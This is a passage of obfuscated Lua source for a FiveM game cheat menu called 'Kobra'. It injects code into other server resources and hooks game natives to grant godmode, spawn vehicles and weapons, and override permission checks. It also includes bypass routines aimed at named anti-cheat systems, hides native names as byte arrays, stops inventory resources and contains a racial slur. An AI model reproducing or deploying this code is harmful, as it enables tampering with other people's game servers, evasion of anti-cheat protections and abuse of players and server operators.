            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v226));break;end if (v225==(2 -1)) then MachoHookNative(2596915000000000000 -514694907 ,function(v680) return true,v680;end);MachoHookNative(15321135000000000000,function(v681,v682,v683,v684,v685,v686,v687) return true,v681,v682,v683,v684,v685,v686,v687;end);v225=2 + 0 ;end if (v225==0) then if ( not v224 or ( #v224==(1311 -(430 + 881)))) then return;end v226=table.concat(v224,",");v225=1;end end end;v12.HandleGodmodeToggle=function(v227,v228) local v229=GetResourceState("WaveShield")=="started" ;local v230=((GetResourceState("monitor")=="started") and "monitor") or (v229 and "WaveShield") or "any" ;if v229 then if v228 then local v688=0 + 0 ;while true do if (v688==0) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3000);v48(v230,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else local v689=895 -(557 + 338) ;while true do if (v689==(0 + 0)) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",8454 -5454 );v48(v230,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end if v228 then v12:Notify("success","Kobra","Godmode Enabled",3000);MachoInjectResource2(10 -7 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);else v12:Notify("error","Kobra","Godmode Disabled",7970 -4970 );MachoInjectResource2(6 -3 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);end end;v12.SpawnSelectedVehicle=function(v231,v232,v233,v234) local v235=801 -(499 + 302) ;local v236;local v237;local v238;local v239;local v240;while true do if (v235==(869 -(39 + 827))) then if (GetResourceState("solos-rentals")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",3000);print("Creating Vehicle via Fallback #1");v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v232,tostring(v234),tostring(v233),v239.x,v239.y,v239.z,v240));elseif (GetResourceState("amigo")=="started") then local v938=0 -0 ;while true do if (0==v938) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",3000);print("Creating Vehicle via Fallback #2");v938=2 -1 ;end if (v938==(3 -2)) then v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v232,tostring(v234),tostring(v233)));break;end end elseif v76 then local v1108=0 -0 ;while true do if (v1108==0) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",257 + 2743 );print("Creating Vehicle via Fallback #3");v1108=2 -1 ;end if (v1108==1) then v48(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v232,tostring(v234),tostring(v233)));break;end end elseif (GetResourceState("qb-core")=="started") then local v1168=0 + 0 ;while true do if (1==v1168) then v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v232   .. [["

            if ]]   .. tostring(v234)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v233)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v239.x   .. [[, ]]   .. v239.y   .. [[, ]]   .. v239.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v240   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );break;end if (v1168==(0 -0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",3104 -(103 + 1) );print("Creating Vehicle via Fallback #4");v1168=1;end end elseif ((v238:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1265=554 -(475 + 79) ;while true do if (v1265==(0 -0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",9600 -6600 );print("Creating Vehicle via Fallback #5");v1265=1 + 0 ;end if (v1265==(1 + 0)) then v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v232,tostring(v234),tostring(v233)));break;end end elseif (GetResourceState("lunar_bridge")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",3000);print("Creating Vehicle via Fallback #6");v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v232,tostring(v234),tostring(v233)));elseif (GetResourceState("lation_laundering")=="started") then local v1418=0;while true do if (v1418==(1503 -(1395 + 108))) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",8730 -5730 );print("Creating Vehicle via Fallback #7");v1418=1;end if (v1418==1) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v232,tostring(v233),tostring(v234)));break;end end else local v1419=v75();if v1419 then local v1575=0;while true do if (1==v1575) then v48(v1419,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v232,tostring(v234),tostring(v233)));break;end if (v1575==(1204 -(7 + 1197))) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",3000);print("Creating Vehicle via Fallback #8");v1575=1 + 0 ;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",1047 + 1953 );if ( not v232 or (v232=="")) then return;end local function v1586(v1598) local v1599=319 -(27 + 292) ;local v1600;while true do if (1==v1599) then return "{"   .. table.concat(v1600,",")   .. "}" ;end if (v1599==(0 -0)) then v1600={};for v1659=1 -0 , #v1598 do v1600[v1659]=string.byte(v1598,v1659);end v1599=4 -3 ;end end end local v1587=v1586(v232);local v1588=tostring(v234);local v1589=tostring(v233);local v1590=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1587,v1588,v1589);local v1591,v1592=pcall(MachoInjectResourceRaw,"monitor",v1590);if  not v1591 then end return;end if (GetResourceState("lb-phone")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",5916 -2916 );print("Creating Vehicle via Fallback #10");local v1576,v1577=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v234),v232,tostring(v233),v239.x,v239.y,v239.z,v240));end);if  not v1576 then end elseif (GetResourceState("qb-core")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",5713 -2713 );print("Creating Vehicle via Fallback #11");v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v234),GetHashKey(v232),tostring(v233)));else return;end end break;end if (v235==0) then if ( not v232 or (v232=="")) then return;end v236=PlayerPedId();v235=140 -(43 + 96) ;end if (2==v235) then v239=GetEntityCoords(v236);v240=GetEntityHeading(v236);v235=12 -9 ;end if (v235==(1 -0)) then v237=GetVehiclePedIsIn(v236,false);v238=GetCurrentServerEndpoint();v235=2 + 0 ;end end end;local function v82() local v241=0 + 0 ;local v242;while true do if (1==v241) then return GetResourceState("ReaperV4")=="started" ;end if (v241==(0 -0)) then v242={"WaveShield","FiniAC"};for v690,v691 in ipairs(v242) do if (GetResourceState(v691)=="started") then return false;end end v241=1 + 0 ;end end end local function v83() local v243={"ReaperV4","WaveShield"};for v345,v346 in ipairs(v243) do if (GetResourceState(v346)=="started") then return false;end end return GetResourceState("FiniAC")=="started" ;end v12.SpawnSelectedWeapon=function(v244,v245) local v246=0;local v247;local v248;local v249;local v250;local v251;while true do if (v246==(1940 -(1642 + 298))) then if ( not v245 or (v245=="")) then return;end v247=nil;v246=2 -1 ;end if (2==v246) then v249=PlayerPedId();if ( not v249 or (v249<=(0 -0))) then return;end v246=3;end if ((2 -1)==v246) then function v247(v692) local v693=0 + 0 ;local v694;while true do if (v693==(1 + 0)) then return table.concat(v694,",");end if ((972 -(357 + 615))==v693) then v694={};for v1024=1, #v692 do v694[v1024]=string.byte(v692,v1024);end v693=1 + 0 ;end end end v248=v247(v245);v246=4 -2 ;end if (v246==3) then v250=GetHashKey(v245);if (v250==0) then return;end v246=4;end if (v246==4) then v251=GetResourceState("WaveShield")=="started" ;if v251 then local v764=0;while true do if (v764==0) then v244:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",2571 + 429 );v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v249,v248));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v939=0 -0 ;while true do if (v939==0) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v939=1 + 0 ;end if (v939==3) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v250   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end if (v939==2) then SetCurrentPedWeapon(v249,v250,true);Wait(17 + 233 );v939=3;end if (v939==(1 + 0)) then v244:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",3000);GiveWeaponToPed(v249,v250,9999,false,true);v939=1303 -(384 + 917) ;end end elseif (GetResourceState("FiniAC")=="started") then local v1109=697 -(128 + 569) ;while true do if (v1109==(1544 -(1407 + 136))) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v248));break;end if (v1109==(1887 -(687 + 1200))) then v244:Notify("info","Kobra","Spawned Weapon Bypass #1",3000);MachoResourceStop("ox_inventory");v1109=1711 -(556 + 1154) ;end end else local v1110=0;while true do if ((3 -2)==v1110) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
